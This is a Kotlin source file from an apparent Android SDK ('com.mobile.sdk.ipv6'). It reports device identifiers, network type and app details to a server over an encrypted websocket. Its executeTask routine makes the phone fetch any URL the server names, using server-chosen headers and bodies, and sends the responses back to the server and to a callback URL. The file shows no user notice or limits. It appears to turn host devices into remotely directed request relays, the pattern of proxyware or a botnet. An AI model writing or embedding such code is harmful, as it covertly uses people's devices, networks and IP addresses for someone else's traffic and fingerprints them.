package com.mobile.sdk.ipv6.socket

import com.google.gson.Gson
import com.mobile.guava.android.log.deviceInfo
import com.mobile.guava.android.mvvm.AndroidX
import com.mobile.sdk.ipv6.Ipv6X
import com.mobile.sdk.ipv6.base.AesUtils
import com.mobile.sdk.ipv6.base.AppUtils
import com.mobile.sdk.ipv6.base.NetworkUtils
import com.mobile.sdk.ipv6.base.RSAUtils
import com.mobile.sdk.ipv6.data.api.ApiPhone
import com.mobile.sdk.ipv6.data.api.ApiTask
import com.mobile.sdk.ipv6.data.api.ApiTaskRequest
import com.mobile.sdk.ipv6.data.api.ApiTaskResult
import com.mobile.sdk.ipv6.proto.CommonMessage
import com.squareup.moshi.Types
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.HttpUrl.Companion.toHttpUrl
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.Buffer
import okio.ByteString
import okio.ByteString.Companion.encodeUtf8
import okio.ByteString.Companion.toByteString
import timber.log.Timber
import java.util.*

object SocketUtils {

    fun postPhone() = GlobalScope.launch {
        withContext(Dispatchers.Main) {
            Ipv6X.isSocketConnected.value = true
        }
        val phone = ApiPhone(
            AppUtils.installId(AndroidX.myApp),
            deviceInfo(),
            NetworkUtils.getNetWorkType(AndroidX.myApp),
            AppUtils.packageName(AndroidX.myApp),
            AppUtils.appName(AndroidX.myApp),
            AppUtils.versionName(AndroidX.myApp)
        )
        val json = Ipv6X.component.json().adapter(ApiPhone::class.java)
            .toJson(phone)
            .encodeUtf8()

        val msg = CommonMessage.Builder()
            .bizId(2001)
            .msgType(3)
            .content(json)
            .build()

        AppWebSocket.post(CommonMessage.ADAPTER.encodeByteString(msg))
    }

    fun encrypt(byteString: ByteString): ByteString {
        val aseKey = UUID.randomUUID().toString().substring(0, 16)
        val encryptedAES = AesUtils.encrypt(byteString.toByteArray(), aseKey)
        val encryptedRSA = RSAUtils.encryptByPublicKey(aseKey.toByteArray())
        return Buffer()
            .writeLongLe(encryptedRSA.size.toLong())
            .write(encryptedRSA)
            .writeLongLe(encryptedAES.size.toLong())
            .write(encryptedAES).readByteString()
    }

    fun decrypt(byteString: ByteString): ByteString {
        val buffer = Buffer().write(byteString)
        val rsaLength = buffer.readLongLe()
        val encryptedRSA = buffer.readByteArray(rsaLength)
        val aesLength = buffer.readLongLe()
        val encryptedAES = buffer.readByteArray(aesLength)
        val aseKey = RSAUtils.decryptByPrivateKey(encryptedRSA).toString(Charsets.UTF_8)
        val decryptedAES = AesUtils.decrypt(encryptedAES, aseKey)
        return decryptedAES.toByteString()
    }

    fun executeTask(json: String) = GlobalScope.launch {
        try {
            Timber.tag(Ipv6X.TAG).d(json)
            val task = Ipv6X.component.json()
                .adapter<ApiTask>(ApiTask::class.java)
                .fromJson(json)!!
            executeTask(task)
        } catch (e: Exception) {
            Timber.e(e)
        }
    }

    private fun executeTask(task: ApiTask) {
        val jsonMediaType = "application/json; charset=utf-8".toMediaType()
        val requestBuilder = Request.Builder()
        val httpUrlBuilder = task.url.toHttpUrl().newBuilder()

        task.header.forEach { (t, u) ->
            requestBuilder.addHeader(t, u)
        }

        if (task.requestType.equals("GET", true)) {
            task.body?.forEach { (t, u) ->
                httpUrlBuilder.addQueryParameter(t, u)
            }
            requestBuilder.get()
        } else {
            val type = Types.newParameterizedType(
                Map::class.java,
                String::class.java,
                String::class.java
            )
            val json = Ipv6X.component.json()
                .adapter<Map<String, String>>(type)
                .toJson(task.body)
            requestBuilder.post(json.toRequestBody(jsonMediaType))
        }

        requestBuilder.url(httpUrlBuilder.build())

        val response = Ipv6X.component.okHttpClient()
            .newCall(requestBuilder.build())
            .execute()

        val data = response.body?.string().orEmpty()
        val request = if (task.body == null) {
            Gson().toJson(ApiTaskRequest(response.code, data, formdata = task.formdata))
        } else {
            Gson().toJson(ApiTaskRequest(response.code, data, body = task.body))
        }

        Timber.tag(Ipv6X.TAG).d("------1004:%s", request)
        postTaskResult(data, response.code, task)

        if (response.isSuccessful) {
            if (task.callbackUrl.isNullOrEmpty()) {
                Timber.tag(Ipv6X.TAG).d("empty callback url")
            } else {
                val callbackRequest = Request.Builder()
                    .url(task.callbackUrl)
                    .post(request.toRequestBody(jsonMediaType))
                    .build()

                Ipv6X.component.okHttpClient()
                    .newCall(callbackRequest)
                    .execute()
            }
        } else {
        }
    }

    @JvmStatic
    private fun postTaskResult(body: String, code: Int, task: ApiTask) {
        val json = Ipv6X.component.json()
            .adapter(ApiTaskResult::class.java)
            .toJson(
                ApiTaskResult(
                    code,
                    task.taskId,
                    if (task.callbackUrl.isNullOrEmpty()) body else null
                )
            )

        Timber.tag(Ipv6X.TAG).d(json)

        val msg = CommonMessage.Builder()
            .bizId(4001)
            .msgType(3)
            .content(json.encodeUtf8())
            .build()

        AppWebSocket.post(CommonMessage.ADAPTER.encodeByteString(msg))
    }
}